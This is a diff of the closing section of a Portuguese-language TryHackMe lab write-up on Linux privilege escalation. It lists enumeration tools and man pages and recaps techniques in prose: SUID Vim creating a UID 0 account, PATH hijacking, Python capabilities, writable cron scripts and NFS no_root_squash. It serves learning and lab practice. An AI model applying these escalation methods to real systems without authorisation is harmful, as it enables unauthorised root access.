+- [PEASS-ng / LinPEAS](https://github.com/peass-ng/PEASS-ng) — automação de checks comuns de enumeração e escalação no Linux.
+- [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration) — enumeração organizada por níveis de detalhe.
+- Manual do próprio Linux: <code>man sudoers</code>, <code>man capabilities</code>, <code>man exports</code>, <code>man crontab</code> e <code>man find</code>.
 
-A parte mais importante não foi decorar um exploit, mas **entender por que ele se encaixa em determinada configuração**.
+Os scripts de enumeração ajudam a achar pistas, mas não substituem entender o que cada permissão significa ou por que a configuração é perigosa.
 
-- O Apache2 revelou uma linha protegida porque tentou interpretá-la como configuração.
-- O Vim com SUID permitiu modificar o banco de contas e criar outra identidade UID 0 na VM.
-- O PATH Hijacking funcionou quando substituí o comando que o binário real procurava (<code>whoami</code>), e não o nome do exemplo (<code>thm</code>).
-- A capability do Python demonstrou que um binário pode ter permissões perigosas sem possuir SUID.
-- O Cron mostrou o risco de executar periodicamente scripts graváveis por qualquer usuário.
-- O NFS demonstrou como <code>no_root_squash</code> pode atravessar a fronteira entre duas máquinas e permitir execução privilegiada.
+### Próximo laboratório
 
-No NFS, inclusive, dois pequenos erros atrasaram o processo: compilar diretamente no compartilhamento provocou <code>Text file busy</code>, e depois apliquei <code>chmod</code> ao arquivo <code>nfs</code> em vez de <code>nfs2</code>. Conferir o caminho, o proprietário e o bit <code>s</code> resolveu.
-
-**Regra prática:** enumerar, interpretar permissões, entender a chamada do programa, testar, comprovar o UID e registrar a correção. É assim que os comandos deixam de ser apenas receitas copiadas e passam a fazer sentido.
-
-### Referências
-
-- [GTFOBins](https://gtfobins.github.io/) — usos especiais de binários Unix.
-- [TryHackMe](https://tryhackme.com/) — laboratórios e exercícios de Linux Privilege Escalation.
-- Documentação local: <code>man sudoers</code>, <code>man capabilities</code>, <code>man exports</code>, <code>man 5 crontab</code>, <code>man find</code> e <code>man ld.so</code>.
+Na próxima room, [Linux Privilege Escalation: Automation](https://tryhackme.com/room/linprivautomation), o foco será automatizar a enumeração e trabalhar com ferramentas e exploits públicos.
 
 [↑ Voltar ao topo](#topo)
